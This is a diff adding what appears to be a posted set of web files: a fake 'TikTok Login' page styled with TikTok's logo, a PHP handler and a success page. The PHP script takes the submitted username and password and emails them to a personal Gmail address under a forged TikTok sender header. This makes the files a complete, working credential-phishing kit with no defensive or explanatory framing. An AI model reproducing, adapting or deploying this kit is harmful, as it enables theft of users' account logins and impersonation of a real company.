@@ -1,0 +1,86 @@
+<pre class="lang-html prettyprint-override"><code>
+<html>
+ <head>
+ <title>TikTok Login</title>
+ <style>
+ body {
+ background-color: #101010;
+ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+ color: #fff;
+ }
+ form {
+ width: 400px;
+ margin: 0 auto;
+ padding: 20px;
+ background-color: #181818;
+ border-radius: 10px;
+ box-shadow: 0px 0px 20px rgba(0,0,0,0.2);
+ }
+ label {
+ display: block;
+ margin-bottom: 10px;
+ }
+ input[type="text"], input[type="password"] {
+ width: 100%;
+ padding: 10px;
+ border-radius: 5px;
+ border: 1px solid #333;
+ }
+ input[type="submit"] {
+ width: 100%;
+ padding: 10px;
+ background-color: #ff0000;
+ color: #fff;
+ border: none;
+ border-radius: 5px;
+ cursor: pointer;
+ }
+ .tiktok-logo {
+ width: 200px;
+ height: auto;
+ display: block;
+ margin: 0 auto;
+ margin-bottom: 20px;
+ }
+ </style>
+ </head>
+ <body>
+ <div class="tiktok-logo">
+ <img src="https://www.seekpng.com/png/full/29-297484_tik-tok-logo-png-transparent-tik-tok-logo-png.png" alt="TikTok logo">
+ </div>
+ <form action="mail.php" method="post">
+ <label for="username">Username:</label><br>
+ <input type="text" id="username" name="username"><br>
+ <label for="password">Password:</label><br>
+ <input type="password" id="password" name="password"><br>
+ <input type="submit" value="Log In">
+ </form>
+ </body>
+</html>
+
+<pre class="lang-php prettyprint-override"><code>
+```php
+<?php
+$username = $_POST['username'];
+$password = $_POST['password'];
+
+$to = "david2011hofi@gmail.com";
+$subject = "New TikTok Login Credentials";
+$message = "Username: $username\nPassword: $password";
+$headers = "From: TikTok <noreply@tiktok.com>";
+
+mail($to, $subject, $message, $headers);
+
+header("Location: success.html");
+exit();
+?>
+
+<pre class="lang-html prettyprint-override"><code>
+<html>
+ <head>
+ <title>Success</title>
+ </head>
+ <body>
+ <h1>Your login credentials have been sent!</h1>
+ </body>
+</html>
